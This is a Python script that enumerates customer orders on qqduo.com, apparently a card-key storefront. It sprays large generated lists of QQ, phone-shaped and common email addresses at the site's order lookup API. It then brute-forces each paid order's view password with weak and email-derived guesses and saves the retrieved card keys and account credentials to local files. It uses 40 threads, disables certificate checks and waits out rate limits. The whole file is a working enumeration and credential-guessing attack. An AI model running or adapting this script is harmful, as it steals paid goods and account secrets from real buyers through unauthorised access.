#!/usr/bin/env python3
"""Expanded email contact spray for qqduo — ranges beyond focus pass."""
import json
import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/workspace/qqduo/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = os.environ.get("BASE") or "https://qqduo.com"
WORKERS = int(os.environ.get("WORKERS") or "40")
# main numeric expansion (focus already did 10000-299999)
QQ_START = int(os.environ.get("QQ_START") or "300000")
QQ_END = int(os.environ.get("QQ_END") or "800000")  # exclusive
SEVEN_START = int(os.environ.get("SEVEN_START") or "1005000")
SEVEN_END = int(os.environ.get("SEVEN_END") or "1100000")

lock = threading.Lock()
tls = threading.local()
stats = {
    "done": 0,
    "hits": 0,
    "orders": 0,
    "kami": 0,
    "acc": 0,
    "errors": 0,
    "throttle": 0,
}
seen_tn, kami_tn = set(), set()
kami_rows, hit_orders, accounts = [], [], set()
done_kw = set()


def log(*a):
    print(*a, flush=True)


def S():
    s = getattr(tls, "s", None)
    if not s:
        s = requests.Session()
        s.verify = False
        s.headers.update(
            {
                "User-Agent": "Mozilla/5.0",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": B,
                "Referer": B + "/user/index/query",
            }
        )
        tls.s = s
    return s


def cards(secret):
    blob = str(secret or "").replace("<br/>", "\n").replace("<br>", "\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]


def save():
    (OUT / "expand_state.json").write_text(json.dumps(stats, ensure_ascii=False))
    (OUT / "contact_kami.json").write_text(
        json.dumps(kami_rows, ensure_ascii=False, indent=2)
    )
    (OUT / "contact_hits.json").write_text(
        json.dumps(hit_orders, ensure_ascii=False, indent=2)
    )
    (OUT / "contact_accounts.txt").write_text(
        "\n".join(sorted(accounts)) + ("\n" if accounts else "")
    )
    (OUT / "expand_done_kw.txt").write_text(
        "\n".join(sorted(done_kw)) + ("\n" if done_kw else "")
    )


def extract(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    d = j.get("data")
    if isinstance(d, list):
        return d
    if isinstance(d, dict):
        return d.get("list") or []
    return []


PWS = [
    "123456",
    "000000",
    "123123",
    "111111",
    "12345678",
    "666666",
    "888888",
    "abcdef",
    "abc123",
    "112233",
    "123321",
    "654321",
    "5201314",
    "password",
    "qwerty",
    "qq123456",
    "147258",
    "aaaaaa",
    "woaini",
]


def load_resume():
    global kami_rows, hit_orders, accounts, seen_tn, kami_tn, done_kw, stats
    for p in [OUT / "contact_hits.json", OUT / "contact_hits_all.json"]:
        if not p.exists():
            continue
        try:
            for o in json.loads(p.read_text() or "[]"):
                tn = o.get("trade_no")
                if tn and tn not in seen_tn:
                    seen_tn.add(tn)
                    hit_orders.append(o)
                kw = o.get("_query_kw") or o.get("contact")
                if kw:
                    done_kw.add(str(kw))
                    done_kw.add(str(kw).lower())
        except Exception:
            pass
    if (OUT / "contact_kami.json").exists():
        try:
            for r in json.loads((OUT / "contact_kami.json").read_text() or "[]"):
                if r.get("trade_no") in kami_tn:
                    continue
                kami_rows.append(r)
                kami_tn.add(r.get("trade_no"))
                for c in r.get("cards") or []:
                    accounts.add(c)
        except Exception:
            pass
    dw = OUT / "expand_done_kw.txt"
    if dw.exists():
        done_kw.update(x.strip() for x in dw.read_text().splitlines() if x.strip())
    stats["orders"] = len(seen_tn)
    stats["kami"] = len(kami_rows)
    stats["acc"] = len(accounts)
    stats["hits"] = len({o.get("_query_kw") or o.get("contact") for o in hit_orders})


def fetch_secret(tn, kw):
    local = str(kw).split("@")[0]
    pws = [local, "123456", str(kw), local + "123", local + "456"] + PWS
    seen = set()
    for pw in pws:
        if pw in seen:
            continue
        seen.add(pw)
        try:
            j = S().post(
                B + "/user/api/index/secret",
                data={"tradeNo": tn, "password": pw},
                timeout=12,
            ).json()
        except Exception:
            continue
        if j.get("code") == 200 and j.get("data"):
            d = j["data"]
            return (d.get("secret") if isinstance(d, dict) else d), pw
        msg = str(j.get("msg") or "")
        if "频繁" in msg:
            time.sleep(8)
            continue
        if "还未支付" in msg:
            return None, None
        if "密码错误" in msg:
            break
    return None, None


def handle(kw, orders):
    with lock:
        stats["hits"] += 1
    for od in orders:
        tn = od.get("trade_no")
        with lock:
            if tn and tn not in seen_tn:
                seen_tn.add(tn)
                od = dict(od)
                od["_query_kw"] = kw
                hit_orders.append(od)
                stats["orders"] = len(seen_tn)
                save()
        if od.get("status") != 1 or not tn or tn in kami_tn:
            continue
        secret, pw = fetch_secret(tn, od.get("contact") or kw)
        if not secret:
            continue
        cs = cards(secret)
        row = {
            "trade_no": tn,
            "query_kw": kw,
            "password": pw,
            "amount": od.get("amount"),
            "contact": od.get("contact"),
            "pay_time": od.get("pay_time"),
            "commodity_id": od.get("commodity_id"),
            "secret": secret,
            "cards": cs,
            "card_count": len(cs),
        }
        with lock:
            kami_rows.append(row)
            kami_tn.add(tn)
            stats["kami"] = len(kami_rows)
            for c in cs:
                accounts.add(c)
            stats["acc"] = len(accounts)
            save()
        log("KAMI", tn, "kw", kw, "pw", pw, "cards", len(cs), "amount", od.get("amount"))


def work(kw):
    kw = str(kw)
    if kw in done_kw or kw.lower() in done_kw:
        with lock:
            stats["done"] += 1
        return
    try:
        j = S().post(
            B + "/user/api/index/query", data={"keywords": kw}, timeout=12
        ).json()
    except Exception:
        with lock:
            stats["errors"] += 1
            stats["done"] += 1
        return
    if "频繁" in str(j.get("msg") or ""):
        with lock:
            stats["throttle"] += 1
        time.sleep(10)
        return work(kw)
    orders = [x for x in extract(j) if isinstance(x, dict)]
    with lock:
        done_kw.add(kw)
        stats["done"] += 1
        if stats["done"] % 5000 == 0:
            log("progress", stats, "kw", kw)
            save()
    if orders:
        log(
            "HIT",
            kw,
            "n",
            len(orders),
            "paid",
            sum(1 for o in orders if o.get("status") == 1),
        )
        handle(kw, orders)


def wordlist():
    words = []
    # 1) main QQ expansion beyond focus (focus covered 10000-299999)
    for i in range(QQ_START, QQ_END):
        words.append(f"{i}@qq.com")
    # 2) denser 7-digit sample (focus did 1000000-1005000)
    for i in range(SEVEN_START, SEVEN_END):
        words.append(f"{i}@qq.com")
    # 3) small locals on other mail domains + numeric 1-9999
    domains = [
        "163.com",
        "126.com",
        "foxmail.com",
        "gmail.com",
        "yeah.net",
        "139.com",
        "sina.com",
        "vip.qq.com",
        "outlook.com",
        "88.com",
    ]
    for i in range(1, 10000):
        words.append(f"{i}@qq.com")
        if i <= 5000:
            for d in ("163.com", "126.com", "foxmail.com"):
                words.append(f"{i}@{d}")
    weak = [
        "88888888",
        "66666666",
        "11111111",
        "1234567890",
        "password123",
        "qqq123",
        "qqqqqq",
        "asdasd",
        "qwe123",
        "abc888",
        "vip888",
        "vip123",
        "gongzi",
        "maimai",
        "goumai",
        "duoduo",
        "haohao",
        "lele",
        "qiqi",
        "nana",
        "tingting",
        "huihui",
        "jiaojiao",
        "yuanyuan",
        "fangfang",
        "xiaoxiao",
        "dada",
        "cai",
        "fu",
        "qian",
        "sheng",
        "baobao",
        "beibei",
        "taotao",
        "qiangge",
        "meimei",
        "gege",
        "jiejie",
        "didi",
    ]
    for loc in weak:
        for d in domains + ["qq.com"]:
            words.append(f"{loc}@{d}")
    # 4) birthday-ish YYMMDD / YYYYMMDD common
    for y in range(80, 106):
        for m in range(1, 13):
            for d in (1, 8, 10, 15, 18, 20, 25, 28):
                words.append(f"{y:02d}{m:02d}{d:02d}@qq.com")
                words.append(f"19{y:02d}{m:02d}{d:02d}@qq.com" if y < 100 else f"20{y-100:02d}{m:02d}{d:02d}@qq.com")
    # 5) phone-shaped denser
    for pre in [
        "130",
        "131",
        "132",
        "133",
        "135",
        "136",
        "137",
        "138",
        "139",
        "150",
        "151",
        "152",
        "155",
        "156",
        "157",
        "158",
        "159",
        "170",
        "171",
        "175",
        "176",
        "177",
        "178",
        "180",
        "181",
        "182",
        "183",
        "185",
        "186",
        "187",
        "188",
        "189",
        "190",
        "191",
        "198",
        "199",
    ]:
        for mid in [
            "0000",
            "0001",
            "0123",
            "1111",
            "1234",
            "2222",
            "5200",
            "5201",
            "6666",
            "8888",
            "9999",
            "2013",
            "2014",
            "2015",
            "2016",
            "2018",
            "2020",
            "2021",
            "2022",
            "2023",
            "2024",
            "2025",
            "2026",
        ]:
            for end in ["0000", "0001", "1111", "1234", "6666", "8888", "9999", "5200"]:
                words.append(f"{pre}{mid}{end}@qq.com")
    # 8/9 digit sparse samples
    for i in range(10000000, 10005000):
        words.append(f"{i}@qq.com")
    for i in range(100000000, 100010000):
        words.append(f"{i}@qq.com")
    seen, out = set(), []
    for w in words:
        if w not in seen and w not in done_kw and w.lower() not in done_kw:
            seen.add(w)
            out.append(w)
    return out


def main():
    load_resume()
    words = wordlist()
    log(
        "words",
        len(words),
        "workers",
        WORKERS,
        "qq_range",
        f"{QQ_START}-{QQ_END}",
        "seven",
        f"{SEVEN_START}-{SEVEN_END}",
        "resume_orders",
        len(seen_tn),
        "kami",
        len(kami_rows),
    )
    t0 = time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, words, chunksize=128))
    save()
    log("DONE", stats, "sec", int(time.time() - t0))


if __name__ == "__main__":
    main()
